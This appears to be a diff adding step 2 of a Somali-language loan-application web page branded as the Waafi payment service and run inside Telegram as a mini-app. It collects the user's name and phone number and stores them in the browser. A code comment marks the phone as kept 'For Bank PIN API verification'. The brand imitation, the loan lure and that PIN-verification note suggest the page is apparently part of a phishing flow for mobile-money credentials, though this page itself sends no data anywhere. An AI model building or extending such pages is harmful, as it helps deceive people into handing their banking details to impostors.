@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="so">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Codsiga Amaahda - Step 2</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f7f7f7;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .nav-header {
+            width: 100%;
+            background: linear-gradient(90deg, #a4e433 0%, #4caf50 100%);
+            padding: 16px 20px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .nav-header .back-btn-header {
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        .waafi-logo {
+            font-size: 22px;
+            font-weight: 700;
+        }
+        
+        .menu-icon {
+            font-size: 26px;
+            cursor: pointer;
+        }
+        
+        .form-card {
+            background: white;
+            width: 92%;
+            max-width: 480px;
+            margin-top: 20px;
+            padding: 28px 20px;
+            border-radius: 14px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+        }
+        
+        .progress-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+        
+        .bar {
+            height: 4px;
+            flex: 1;
+            background: #e0e0e0;
+            border-radius: 2px;
+        }
+        
+        .bar.active-bar {
+            background: #82d13d;
+        }
+        
+        .input-wrap {
+            margin-bottom: 22px;
+        }
+        
+        label {
+            display: block;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px 16px;
+            border: 1px solid #d1d1d1;
+            border-radius: 10px;
+            font-size: 16px;
+            font-family: inherit;
+            outline: none;
+            transition: border 0.2s;
+            background: #fafafa;
+            color: #333;
+        }
+        
+        input:focus {
+            border-color: #82d13d;
+            background: #fff;
+        }
+        
+        input::placeholder {
+            color: #bbb;
+        }
+        
+        .phone-container {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .country-code {
+            width: 80px;
+            background: #eee;
+            text-align: center;
+            font-weight: 700;
+            border: 1px solid #d1d1d1;
+            line-height: 52px;
+            color: #333;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+        
+        .phone-input {
+            flex: 1;
+        }
+        
+        .phone-hint {
+            font-size: 13px;
+            color: #999;
+            margin-top: 8px;
+        }
+        
+        .btn-container {
+            margin-top: 32px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .back-btn {
+            background: #b0b0b0;
+            color: white;
+            border: none;
+            padding: 17px;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background 0.2s;
+        }
+        
+        .back-btn:active {
+            background: #9a9a9a;
+        }
+        
+        .next-btn {
+            background: #2e7d32;
+            color: white;
+            border: none;
+            padding: 17px;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background 0.2s;
+        }
+        
+        .next-btn:active {
+            background: #1b5e20;
+        }
+        
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #bbb;
+            margin-top: 32px;
+            padding-bottom: 24px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header -->
+    <div class="nav-header">
+        <div class="back-btn-header" onclick="goBack()">← Dib u noqo</div>
+        <div class="waafi-logo">Waafi</div>
+        <div class="menu-icon">☰</div>
+    </div>
+
+    <!-- Form Card -->
+    <div class="form-card">
+        <!-- Progress: Step 2 of 3 -->
+        <div class="progress-box">
+            <div class="bar active-bar"></div>
+            <div class="bar active-bar"></div>
+            <div class="bar"></div>
+        </div>
+
+        <!-- First Name -->
+        <div class="input-wrap">
+            <label for="firstName">Magaca Hore</label>
+            <input type="text" id="firstName" placeholder="Ahmed">
+        </div>
+
+        <!-- Last Name -->
+        <div class="input-wrap">
+            <label for="lastName">Magaca Dambe</label>
+            <input type="text" id="lastName" placeholder="Hassan">
+        </div>
+
+        <!-- Phone -->
+        <div class="input-wrap">
+            <label for="phone">Lambarka Taleefanka</label>
+            <div class="phone-container">
+                <div class="country-code">+252</div>
+                <input type="tel" id="phone" class="phone-input" placeholder="612345678" maxlength="9">
+            </div>
+            <p class="phone-hint">Geli 9 tiro (tusaale: 612345678 ama 907654321)</p>
+        </div>
+
+        <!-- Buttons -->
+        <div class="btn-container">
+            <button type="button" class="back-btn" onclick="goBack()">KA HORE</button>
+            <button type="button" class="next-btn" onclick="goNext()">TALLAABADA XIGTA</button>
+        </div>
+    </div>
+
+    <div class="footer-text">© 2025 Waafi Soomaaliya</div>
+
+    <script>
+        // ---------- Go to next page ----------
+        function goNext() {
+            const fName = document.getElementById('firstName').value.trim();
+            const lName = document.getElementById('lastName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            // Validate all fields
+            if (!fName || !lName || !phone) {
+                alert("Fadlan buuxi dhammaan meelaha banaan.");
+                return;
+            }
+
+            // Validate phone: exactly 9 digits
+            if (!/^\d{9}$/.test(phone)) {
+                alert("Geli number sax ah oo 9 tiro ah.");
+                return;
+            }
+
+            // Save to localStorage
+            localStorage.setItem('firstName', fName);
+            localStorage.setItem('lastName', lName);
+            localStorage.setItem('phone', phone);
+            localStorage.setItem('userPhone', phone); // For Bank PIN API verification
+
+            // Navigate to page4.html
+            window.location.href = "page4.html";
+        }
+
+        // ---------- Go back ----------
+        function goBack() {
+            window.location.href = "page2.html";
+        }
+
+        // ---------- On page load ----------
+        window.addEventListener('DOMContentLoaded', function() {
+            // Telegram integration
+            const tg = window.Telegram && window.Telegram.WebApp;
+            if (tg) {
+                tg.ready();
+                tg.expand();
+            }
+
+            // Auto-fill previously saved data
+            const savedFirstName = localStorage.getItem('firstName');
+            const savedLastName = localStorage.getItem('lastName');
+            const savedPhone = localStorage.getItem('phone');
+
+            if (savedFirstName) document.getElementById('firstName').value = savedFirstName;
+            if (savedLastName) document.getElementById('lastName').value = savedLastName;
+            if (savedPhone) document.getElementById('phone').value = savedPhone;
+        });
+    </script>
+
+</body>
+
+</html>
